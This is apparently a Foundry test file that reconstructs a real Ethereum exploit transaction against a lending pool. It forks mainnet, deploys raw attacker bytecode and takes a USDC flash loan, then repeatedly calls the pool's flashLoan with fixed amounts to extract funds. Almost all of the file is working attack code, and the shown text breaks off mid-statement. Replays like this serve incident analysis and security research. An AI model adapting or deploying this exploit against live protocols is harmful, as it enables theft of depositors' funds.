// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0x2881e839d4d562fad5356183e4f6a9d427ba6f475614ce8ef64dbfe557a4a2cc
// https://etherscan.io/address/0x0Ec330DF28Ae6106a774d0Add3e540Ea8D226E3b

struct S1 {
    uint256 p1;
    uint256 p2;
    uint256 p3;
    uint256 p4;
    uint256 p5;
    uint256 p6;
    uint256 p7;
    address p8;
    address p9;
}

interface I {
    function balanceOf(address) external payable returns (uint256);
    function flashLoan(address, address[] memory, uint256[] memory, uint256[] memory, address, bytes memory, uint16)
        external
        payable;
    function transfer(address, uint256) external payable;
    function flashLoan(address, address[] memory, uint256[] memory, bytes memory) external payable;
    function borrow(address, uint256, uint256, uint16, address) external payable;
    function withdraw(address, uint256, address) external payable;
    function supply(address, uint256, address, uint16) external payable;
    function approve(address, uint256) external payable;
}

contract Xf583 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x2881e839d4d562fad5356183e4f6a9d427ba6f475614ce8ef64dbfe557a4a2cc");
    }

    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x658b = 0x658b0f629B9e3753AA555C189D0cB19C1eD59632;
    address constant x76f0 = 0x76F0C94Ced5B48020bf0D7f3D0CEabC877744cB5;
    address constant x8cc0 = 0x8CC0F052fff7eaD7f2EdCCcaC895502E884a8a71;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xba12 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant xe6b6 = 0xE6B683868D1C168Da88cfe5081E34d9D80E4D1a6;
    address constant xf60a = 0xf60A033D246aE5eE1772989A577ADaAEBCe2366d;

    address x3a39;

    uint256 t_executeOperation = 0;

    function test1() public {
        // vm.startPrank(0x0Ec330DF28Ae6106a774d0Add3e540Ea8D226E3b, 0x0Ec330DF28Ae6106a774d0Add3e540Ea8D226E3b);

        vm.createSelectFork("http://localhost:18545", 18544604); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x8b904cf252953e606443bc02bde3b6d163e6f8f6a98da7ac970f2e51576d46f1));

        // https://explorer.phalcon.xyz/tx/eth/0x8b904cf252953e606443bc02bde3b6d163e6f8f6a98da7ac970f2e51576d46f1
        this.x8b904cf2();
        // https://explorer.phalcon.xyz/tx/eth/0xbbf459c73b2c6b38c1a13c1e26ad7bb15be949eb4fa61b2c42c2e9f9433bed39
        this.xbbf459c7();
        // https://explorer.phalcon.xyz/tx/eth/0x6fdfb55e017a11a8ed23f812a8306920c238148a9e6f59b9cad52cb2c76ecd2c
        this.x6fdfb55e();
        // https://explorer.phalcon.xyz/tx/eth/0x2881e839d4d562fad5356183e4f6a9d427ba6f475614ce8ef64dbfe557a4a2cc
        xa58a199e();
    }

    function test2() public {
        // vm.startPrank(0x0Ec330DF28Ae6106a774d0Add3e540Ea8D226E3b, 0x0Ec330DF28Ae6106a774d0Add3e540Ea8D226E3b);

        vm.createSelectFork("http://localhost:18545", 18544508); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x8b904cf252953e606443bc02bde3b6d163e6f8f6a98da7ac970f2e51576d46f1
        this.x8b904cf2();
        vm.warp(1699655651);
        vm.roll(18544555);
        // https://explorer.phalcon.xyz/tx/eth/0xbbf459c73b2c6b38c1a13c1e26ad7bb15be949eb4fa61b2c42c2e9f9433bed39
        this.xbbf459c7();
        vm.warp(1699655927);
        vm.roll(18544578);
        // https://explorer.phalcon.xyz/tx/eth/0x6fdfb55e017a11a8ed23f812a8306920c238148a9e6f59b9cad52cb2c76ecd2c
        this.x6fdfb55e();
        vm.warp(1699656239);
        vm.roll(18544604);
        // https://explorer.phalcon.xyz/tx/eth/0x2881e839d4d562fad5356183e4f6a9d427ba6f475614ce8ef64dbfe557a4a2cc
        xa58a199e();
    }

    function x6fdfb55e() public {
        r.call(abi.encodeWithSelector(0xa1d34a66, x3a39));
    }

    function xa58a199e() public {
        I(xa0b8).approve(x76f0, type(uint256).max);
        // uint256 v1 = 13923271097322;
        uint256 v1 = I(xa0b8).balanceOf(xba12);
        console2.log("I(xa0b8).balanceOf(xba12)\t->", uint256(13923271097322));

        address[] memory arr01 = new address[](1);
        arr01[0] = xa0b8;
        uint256[] memory arr02 = new uint256[](1);
        arr02[0] = 13923271097322;
        I(xba12).flashLoan(r, arr01, arr02, hex"41");
    }

    function x8b904cf2() public {
        _constructor_();
    }

    function xbbf459c7() public {
        x3a39 = address(new X3a39(r));
    }

    function _constructor_() public {
        bytes memory rt =
            hex"60806040526004361061004d575f3560e01c80636b80e8bb14610150578063920f5c8414610178578063a1d34a66146101b4578063a58a199e146101dc578063ebce073b146101f257610054565b3661005457005b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff160361014e5760065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016101009190611177565b602060405180830381865afa15801561011b573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013f91906111d4565b60098190555061014d61021c565b5b005b34801561015b575f80fd5b5061017660048036038101906101719190611379565b6108db565b005b348015610183575f80fd5b5061019e600480360381019061019991906114ec565b610948565b6040516101ab91906115fc565b60405180910390f35b3480156101bf575f80fd5b506101da60048036038101906101d59190611615565b610c72565b005b3480156101e7575f80fd5b506101f0610d0d565b005b3480156101fd575f80fd5b5061020661109c565b604051610213919061164f565b60405180910390f35b600c60065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016102789190611177565b602060405180830381865afa158015610293573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102b791906111d4565b6102c191906116c2565b600b5f815481106102d5576102d46116f2565b5b905f5260205f20018190555060075f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663617ba03760065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600b5f81548110610354576103536116f2565b5b905f5260205f200154305f6040518563ffffffff1660e01b815260040161037e949392919061176e565b5f604051808303815f87803b158015610395575f80fd5b505af11580156103a7573d5f803e3d5ffd5b5050505060065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600a5f815481106103e1576103e06116f2565b5b905f5260205f20015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f600c5f8154811061043b5761043a6116f2565b5b905f5260205f2001819055505f5b600d5481101561046e5761045b6110a2565b8080610466906117b1565b915050610449565b5060075f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a415bcad60055f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660055f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a0823160035f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016105499190611177565b602060405180830381865afa158015610564573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061058891906111d4565b60025f306040518663ffffffff1660e01b81526004016105ac959493929190611831565b5f604051808303815f87803b1580156105c3575f80fd5b505af11580156105d5573d5f803e3d5ffd5b5050505060055f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660055f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016106929190611177565b602060405180830381865afa1580156106ad573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106d191906111d4565b6040518363ffffffff1660e01b81526004016106ee929190611882565b5f604051808303815f87803b158015610705575f80fd5b505af1158015610717573d5f803e3d5ffd5b5050505060065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60085f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016107d49190611177565b602060405180830381865afa1580156107ef573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061081391906111d4565b6040518363ffffffff1660e01b8152600401610830929190611882565b5f604051808303815f87803b158015610847575f80fd5b505af1158015610859573d5f803e3d5ffd5b5050505060085f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166354efa5646040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156108c3575f80fd5b505af11580156108d5573d5f803e3d5ffd5b50505050565b8273ffffffffffffffffffffffffffffffffffffffff1681836040516109019190611915565b5f6040518083038185875af1925050503d805f811461093b576040519150601f19603f3d011682016040523d82523d5f602084013e610940565b606091505b505050505050565b5f60075f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146109a1575f80fd5b600e5f9054906101000a900460ff16610c615760065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60045f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660045f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610a6d9190611177565b602060405180830381865afa158015610a88573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610aac91906111d4565b6040518363ffffffff1660e01b8152600401610ac9929190611882565b5f604051808303815f87803b158015610ae0575f80fd5b505af1158015610af2573d5f803e3d5ffd5b5050505060075f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166369328dec60065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160045f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610bb19190611177565b602060405180830381865afa158015610bcc573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610bf091906111d4565b610bfa919061192b565b306040518463ffffffff1660e01b8152600401610c199392919061195e565b5f604051808303815f87803b158015610c30575f80fd5b505af1158015610c42573d5f803e3d5ffd5b505050506001600e5f6101000a81548160ff0219169083151502179055505b600190509998505050505050505050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610cca575f80fd5b8060085f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610d65575f80fd5b60065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b360075f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b8152600401610e02929190611882565b5f604051808303815f87803b158015610e19575f80fd5b505af1158015610e2b573d5f803e3d5ffd5b505050505f600167ffffffffffffffff811115610e4b57610e4a611241565b5b604051908082528060200260200182016040528015610e795781602001602082028036833780820191505090505b5090505f600167ffffffffffffffff811115610e9857610e97611241565b5b604051908082528060200260200182016040528015610ec65781602001602082028036833780820191505090505b50905060065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16825f81518110610efe57610efd6116f2565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff168152505060065f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a082315f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401610fb19190611177565b602060405180830381865afa158015610fcc573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610ff091906111d4565b815f81518110611003576110026116f2565b5b6020026020010181815250505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635c38449e3084846040518463ffffffff1660e01b815260040161106b93929190611b5b565b5f604051808303815f87803b158015611082575f80fd5b505af1158015611094573d5f803e3d5ffd5b505050505050565b60095481565b60075f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ab9c4b5d30600a600b600c305f6040518763ffffffff1660e01b815260040161110996959493929190611d9a565b5f604051808303815f87803b158015611120575f80fd5b505af1158015611132573d5f803e3d5ffd5b50505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61116182611138565b9050919050565b61117181611157565b82525050565b5f60208201905061118a5f830184611168565b92915050565b5f604051905090565b5f80fd5b5f80fd5b5f819050919050565b6111b3816111a1565b81146111bd575f80fd5b50565b5f815190506111ce816111aa565b92915050565b5f602082840312156111e9576111e8611199565b5b5f6111f6848285016111c0565b91505092915050565b61120881611157565b8114611212575f80fd5b50565b5f81359050611223816111ff565b92915050565b5f80fd5b5f80fd5b5f601f19601f8301169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b61127782611231565b810181811067ffffffffffffffff8211171561129657611295611241565b5b80604052505050565b5f6112a8611190565b90506112b4828261126e565b919050565b5f67ffffffffffffffff8211156112d3576112d2611241565b5b6112dc82611231565b9050602081019050919050565b828183375f83830152505050565b5f611309611304846112b9565b61129f565b9050828152602081018484840111156113255761132461122d565b5b6113308482856112e9565b509392505050565b5f82601f83011261134c5761134b611229565b5b813561135c8482602086016112f7565b91505092915050565b5f81359050611373816111aa565b92915050565b5f805f606084860312156113905761138f611199565b5b5f61139d86828701611215565b935050602084013567ffffffffffffffff8111156113be576113bd61119d565b5b6113ca86828701611338565b92505060406113db86828701611365565b9150509250925092565b5f80fd5b5f80fd5b5f8083601f84011261140257611401611229565b5b8235905067ffffffffffffffff81111561141f5761141e6113e5565b5b60208301915083602082028301111561143b5761143a6113e9565b5b9250929050565b5f8083601f84011261145757611456611229565b5b8235905067ffffffffffffffff811115611474576114736113e5565b5b6020830191508360208202830111156114905761148f6113e9565b5b9250929050565b5f8083601f8401126114ac576114ab611229565b5b8235905067ffffffffffffffff8111156114c9576114c86113e5565b5b6020830191508360018202830111156114e5576114e46113e9565b5b9250929050565b5f805f805f805f805f60a08a8c03121561150957611508611199565b5b5f8a013567ffffffffffffffff8111156115265761152561119d565b5b6115328c828d016113ed565b995099505060208a013567ffffffffffffffff8111156115555761155461119d565b5b6115618c828d01611442565b975097505060408a013567ffffffffffffffff8111156115845761158361119d565b5b6115908c828d01611442565b955095505060606115a38c828d01611215565b93505060808a013567ffffffffffffffff8111156115c4576115c361119d565b5b6115d08c828d01611497565b92509250509295985092959850929598565b5f8115159050919050565b6115f6816115e2565b82525050565b5f60208201905061160f5f8301846115ed565b92915050565b5f6020828403121561162a57611629611199565b5b5f61163784828501611215565b91505092915050565b611649816111a1565b82525050565b5f6020820190506116625f830184611640565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6116cc826111a1565b91506116d7836111a1565b9250826116e7576116e6611668565b5b828204905092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f819050919050565b5f61ffff82169050919050565b5f819050919050565b5f61175861175361174e8461171f565b611735565b611728565b9050919050565b6117688161173e565b82525050565b5f6080820190506117815f830187611168565b61178e6020830186611640565b61179b6040830185611168565b6117a8606083018461175f565b95945050505050565b5f6117bb826111a1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036117ed576117ec611695565b5b600182019050919050565b5f819050919050565b5f61181b611816611811846117f8565b611735565b6111a1565b9050919050565b61182b81611801565b82525050565b5f60a0820190506118445f830188611168565b6118516020830187611640565b61185e6040830186611822565b61186b606083018561175f565b6118786080830184611168565b9695505050505050565b5f6040820190506118955f830185611168565b6118a26020830184611640565b9392505050565b5f81519050919050565b5f81905092915050565b5f5b838110156118da5780820151818401526020810190506118bf565b5f8484015250505050565b5f6118ef826118a9565b6118f981856118b3565b93506119098185602086016118bd565b80840191505092915050565b5f61192082846118e5565b915081905092915050565b5f611935826111a1565b9150611940836111a1565b925082820390508181111561195857611957611695565b5b92915050565b5f6060820190506119715f830186611168565b61197e6020830185611640565b61198b6040830184611168565b949350505050565b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b6119c581611157565b82525050565b5f6119d683836119bc565b60208301905092915050565b5f602082019050919050565b5f6119f882611993565b611a02818561199d565b9350611a0d836119ad565b805f5b83811015611a3d578151611a2488826119cb565b9750611a2f836119e2565b925050600181019050611a10565b5085935050505092915050565b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b611a7c816111a1565b82525050565b5f611a8d8383611a73565b60208301905092915050565b5f602082019050919050565b5f611aaf82611a4a565b611ab98185611a54565b9350611ac483611a64565b805f5b83811015611af4578151611adb8882611a82565b9750611ae683611a99565b925050600181019050611ac7565b5085935050505092915050565b5f82825260208201905092915050565b7f41000000000000000000000000000000000000000000000000000000000000005f82015250565b5f611b45600183611b01565b9150611b5082611b11565b602082019050919050565b5f608082019050611b6e5f830186611168565b8181036020830152611b8081856119ee565b90508181036040830152611b948184611aa5565b90508181036060830152611ba781611b39565b9050949350505050565b5f81549050919050565b5f819050815f5260205f209050919050565b5f815f1c9050919050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f611c09611c0483611bcd565b611bd8565b9050919050565b5f611c1b8254611bf7565b9050919050565b5f600182019050919050565b5f611c3882611bb1565b611c42818561199d565b9350611c4d83611bbb565b805f5b83811015611c8457611c6182611c10565b611c6b88826119cb565b9750611c7683611c22565b925050600181019050611c50565b5085935050505092915050565b5f81549050919050565b5f819050815f5260205f209050919050565b5f819050919050565b5f611cc8611cc383611bcd565b611cad565b9050919050565b5f611cda8254611cb6565b9050919050565b5f600182019050919050565b5f611cf782611c91565b611d018185611a54565b9350611d0c83611c9b565b805f5b83811015611d4357611d2082611ccf565b611d2a8882611a82565b9750611d3583611ce1565b925050600181019050611d0f565b5085935050505092915050565b7f41410000000000000000000000000000000000000000000000000000000000005f82015250565b5f611d84600283611b01565b9150611d8f82611d50565b602082019050919050565b5f60e082019050611dad5f830189611168565b8181036020830152611dbf8188611c2e565b90508181036040830152611dd38187611ced565b90508181036060830152611de78186611ced565b9050611df66080830185611168565b81810360a0830152611e0781611d78565b9050611e1660c083018461175f565b97965050505050505056fea2646970667358221220fc5ecf5c949c1e5dc26c2160d7752c53f4b22379e89598b17a60d9784d92535764736f6c63430008150033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function executeOperation(address[] memory, uint256[] memory, uint256[] memory, address, bytes memory) public {
        t_executeOperation++;

        if (t_executeOperation == 1) {
            // uint256 v1 = 1160272591443;
            uint256 v1 = I(x658b).balanceOf(r);
            console2.log("I(x658b).balanceOf(r)\t\t->", uint256(1160272591443));
            I(xa0b8).transfer(x658b, v1);
            // uint256 v2 = 1160272591443;
            uint256 v2 = I(x658b).balanceOf(r);
            console2.log("I(x658b).balanceOf(r)\t\t->", uint256(1160272591443));
            I(x76f0).withdraw(xa0b8, 1160272591442, r);

            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_executeOperation <= 55) {
            bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
    }

    function xa1d34a66() public {}

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) public {
        // uint256 v1 = 13923271097322;
        uint256 v1 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(13923271097322));
        // uint256 v2 = 13923271097322;
        uint256 v2 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(13923271097322));
        I(x76f0).supply(xa0b8, 1160272591443, r, 0);

        address[] memory arr06 = new address[](1);
        arr06[0] = xa0b8;
        uint256[] memory arr07 = new uint256[](1);
        arr07[0] = 1160272591443;
        uint256[] memory arr08 = new uint256[](1);
        arr08[0] = 0;
        I(x76f0).flashLoan(r, arr06, arr07, arr08, r, hex"4141", 0);

        address[] memory arr15 = new address[](1);
        arr15[0] = xa0b8;
        uint256[] memory arr16 = new uint256[](1);
        arr16[0] = 1160272591443;
        uint256[] memory arr17 = new uint256[](1);
        arr17[0] = 0;
        I(x76f0).flashLoan(r, arr15, arr16, arr17, r, hex"4141", 0);

        address[] memory arr24 = new address[](1);
        arr24[0] = xa0b8;
        uint256[] memory arr25 = new uint256[](1);
        arr25[0] = 1160272591443;
        uint256[] memory arr26 = new uint256[](1);
        arr26[0] = 0;
        I(x76f0).flashLoan(r, arr24, arr25, arr26, r, hex"4141", 0);

        address[] memory arr33 = new address[](1);
        arr33[0] = xa0b8;
        uint256[] memory arr34 = new uint256[](1);
        arr34[0] = 1160272591443;
        uint256[] memory arr35 = new uint256[](1);
        arr35[0] = 0;
        I(x76f0).flashLoan(r, arr33, arr34, arr35, r, hex"4141", 0);

        address[] memory arr42 = new address[](1);
        arr42[0] = xa0b8;
        uint256[] memory arr43 = new uint256[](1);
        arr43[0] = 1160272591443;
        uint256[] memory arr44 = new uint256[](1);
        arr44[0] = 0;
        I(x76f0).flashLoan(r, arr42, arr43, arr44, r, hex"4141", 0);

        address[] memory arr51 = new address[](1);
        arr51[0] = xa0b8;
        uint256[] memory arr52 = new uint256[](1);
        arr52[0] = 1160272591443;
        uint256[] memory arr53 = new uint256[](1);
        arr53[0] = 0;
        I(x76f0).flashLoan(r, arr51, arr52, arr53, r, hex"4141", 0);

        address[] memory arr60 = new address[](1);
        arr60[0] = xa0b8;
        uint256[] memory arr61 = new uint256[](1);
        arr61[0] = 1160272591443;
        uint256[] memory arr62 = new uint256[](1);
        arr62[0] = 0;
        I(x76f0).flashLoan(r, arr60, arr61, arr62, r, hex"4141", 0);

        address[] memory arr69 = new address[](1);
        arr69[0] = xa0b8;
        uint256[] memory arr70 = new uint256[](1);
        arr70[0] = 1160272591443;
        uint256[] memory arr71 = new uint256[](1);
        arr71[0] = 0;
        I(x76f0).flashLoan(r, arr69, arr70, arr71, r, hex"4141", 0);

        address[] memory arr78 = new address[](1);
        arr78[0] = xa0b8;
        uint256[] memory arr79 = new uint256[](1);
        arr79[0] = 1160272591443;
        uint256[] memory arr80 = new uint256[](1);
        arr80[0] = 0;
        I(x76f0).flashLoan(r, arr78, arr79, arr80, r, hex"4141", 0);

        address[] memory arr87 = new address[](1);
        arr87[0] = xa0b8;
        uint256[] memory arr88 = new uint256[](1);
        arr88[0] = 1160272591443;
        uint256[] memory arr89 = new uint256[](1);
        arr89[0] = 0;
        I(x76f0).flashLoan(r, arr87, arr88, arr89, r, hex"4141", 0);

        address[] memory arr96 = new address[](1);
        arr96[0] = xa0b8;
        uint256[] memory arr97 = new uint256[](1);
        arr97[0] = 1160272591443;
        uint256[] memory arr98 = new uint256[](1);
        arr98[0] = 0;
        I(x76f0).flashLoan(r, arr96, arr97, arr98, r, hex"4141", 0);

        address[] memory arr105 = new address[](1);
        arr105[0] = xa0b8;
        uint256[] memory arr106 = new uint256[](1);
        arr106[0] = 1160272591443;
        uint256[] memory arr107 = new uint256[](1);
        arr107[0] = 0;
        I(x76f0).flashLoan(r, arr105, arr106, arr107, r, hex"4141", 0);

        address[] memory arr114 = new address[](1);
        arr114[0] = xa0b8;
        uint256[] memory arr115 = new uint256[](1);
        arr115[0] = 1160272591443;
        uint256[] memory arr116 = new uint256[](1);
        arr116[0] = 0;
        I(x76f0).flashLoan(r, arr114, arr115, arr116, r, hex"4141", 0);

        address[] memory arr123 = new address[](1);
        arr123[0] = xa0b8;
        uint256[] memory arr124 = new uint256[](1);
        arr124[0] = 1160272591443;
        uint256[] memory arr125 = new uint256[](1);
        arr125[0] = 0;
        I(x76f0).flashLoan(r, arr123, arr124, arr125, r, hex"4141", 0);

        address[] memory arr132 = new address[](1);
        arr132[0] = xa0b8;
        uint256[] memory arr133 = new uint256[](1);
        arr133[0] = 1160272591443;
        uint256[] memory arr134 = new uint256[](1);
        arr134[0] = 0;
        I(x76f0).flashLoan(r, arr132, arr133, arr134, r, hex"4141", 0);

        address[] memory arr141 = new address[](1);
        arr141[0] = xa0b8;
        uint256[] memory arr142 = new uint256[](1);
        arr142[0] = 1160272591443;
        uint256[] memory arr143 = new uint256[](1);
        arr143[0] = 0;
        I(x76f0).flashLoan(r, arr141, arr142, arr143, r, hex"4141", 0);

        address[] memory arr150 = new address[](1);
        arr150[0] = xa0b8;
        uint256[] memory arr151 = new uint256[](1);
        arr151[0] = 1160272591443;
        uint256[] memory arr152 = new uint256[](1);
        arr152[0] = 0;
        I(x76f0).flashLoan(r, arr150, arr151, arr152, r, hex"4141", 0);

        address[] memory arr159 = new address[](1);
        arr159[0] = xa0b8;
        uint256[] memory arr160 = new uint256[](1);
        arr160[0] = 1160272591443;
        uint256[] memory arr161 = new uint256[](1);
        arr161[0] = 0;
        I(x76f0).flashLoan(r, arr159, arr160, arr161, r, hex"4141", 0);

        address[] memory arr168 = new address[](1);
        arr168[0] = xa0b8;
        uint256[] memory arr169 = new uint256[](1);
        arr169[0] = 1160272591443;
        uint256[] memory arr170 = new uint256[](1);
        arr170[0] = 0;
        I(x76f0).flashLoan(r, arr168, arr169, arr170, r, hex"4141", 0);

        address[] memory arr177 = new address[](1);
        arr177[0] = xa0b8;
        uint256[] memory arr178 = new uint256[](1);
        arr178[0] = 1160272591443;
        uint256[] memory arr179 = new uint256[](1);
        arr179[0] = 0;
        I(x76f0).flashLoan(r, arr177, arr178, arr179, r, hex"4141", 0);

        address[] memory arr186 = new address[](1);
        arr186[0] = xa0b8;
        uint256[] memory arr187 = new uint256[](1);
        arr187[0] = 1160272591443;
        uint256[] memory arr188 = new uint256[](1);
        arr188[0] = 0;
        I(x76f0).flashLoan(r, arr186, arr187, arr188, r, hex"4141", 0);

        address[] memory arr195 = new address[](1);
        arr195[0] = xa0b8;
        uint256[] memory arr196 = new uint256[](1);
        arr196[0] = 1160272591443;
        uint256[] memory arr197 = new uint256[](1);
        arr197[0] = 0;
        I(x76f0).flashLoan(r, arr195, arr196, arr197, r, hex"4141", 0);

        address[] memory arr204 = new address[](1);
        arr204[0] = xa0b8;
        uint256[] memory arr205 = new uint256[](1);
        arr205[0] = 1160272591443;
        uint256[] memory arr206 = new uint256[](1);
        arr206[0] = 0;
        I(x76f0).flashLoan(r, arr204, arr205, arr206, r, hex"4141", 0);

        address[] memory arr213 = new address[](1);
        arr213[0] = xa0b8;
        uint256[] memory arr214 = new uint256[](1);
        arr214[0] = 1160272591443;
        uint256[] memory arr215 = new uint256[](1);
        arr215[0] = 0;
        I(x76f0).flashLoan(r, arr213, arr214, arr215, r, hex"4141", 0);

        address[] memory arr222 = new address[](1);
        arr222[0] = xa0b8;
        uint256[] memory arr223 = new uint256[](1);
        arr223[0] = 1160272591443;
        uint256[] memory arr224 = new uint256[](1);
        arr224[0] = 0;
        I(x76f0).flashLoan(r, arr222, arr223, arr224, r, hex"4141", 0);

        address[] memory arr231 = new address[](1);
        arr231[0] = xa0b8;
        uint256[] memory arr232 = new uint256[](1);
        arr232[0] = 1160272591443;
        uint256[] memory arr233 = new uint256[](1);
        arr233[0] = 0;
        I(x76f0).flashLoan(r, arr231, arr232, arr233, r, hex"4141", 0);

        address[] memory arr240 = new address[](1);
        arr240[0] = xa0b8;
        uint256[] memory arr241 = new uint256[](1);
        arr241[0] = 1160272591443;
        uint256[] memory arr242 = new uint256[](1);
        arr242[0] = 0;
        I(x76f0).flashLoan(r, arr240, arr241, arr242, r, hex"4141", 0);

        {

            address[] memory arr249 = new address[](1);
            arr249[0] = xa0b8;
            uint256[] memory arr250 = new uint256[](1);
            arr250[0] = 1160272591443;
            uint256[] memory arr251 = new uint256[](1);
            arr251[0] = 0;
            I(x76f0).flashLoan(r, arr249, arr250, arr251, r, hex"4141", 0);

            address[] memory arr258 = new address[](1);
            arr258[0] = xa0b8;
            uint256[] memory arr259 = new uint256[](1);
            arr259[0] = 1160272591443;
            uint256[] memory arr260 = new uint256[](1);
            arr260[0] = 0;
            I(x76f0).flashLoan(r, arr258, arr259, arr260, r, hex"4141", 0);

            address[] memory arr267 = new address[](1);
            arr267[0] = xa0b8;
            uint256[] memory arr268 = new uint256[](1);
            arr268[0] = 1160272591443;
            uint256[] memory arr269 = new uint256[](1);
            arr269[0] = 0;
            I(x76f0).flashLoan(r, arr267, arr268, arr269, r, hex"4141", 0);

            address[] memory arr276 = new address[](1);
            arr276[0] = xa0b8;
            uint256[] memory arr277 = new uint256[](1);
            arr277[0] = 1160272591443;
            uint256[] memory arr278 = new uint256[](1);
            arr278[0] = 0;
            I(x76f0).flashLoan(r, arr276, arr277, arr278, r, hex"4141", 0);

            address[] memory arr285 = new address[](1);
            arr285[0] = xa0b8;
            uint256[] memory arr286 = new uint256[](1);
            arr286[0] = 1160272591443;
            uint256[] memory arr287 = new uint256[](1);
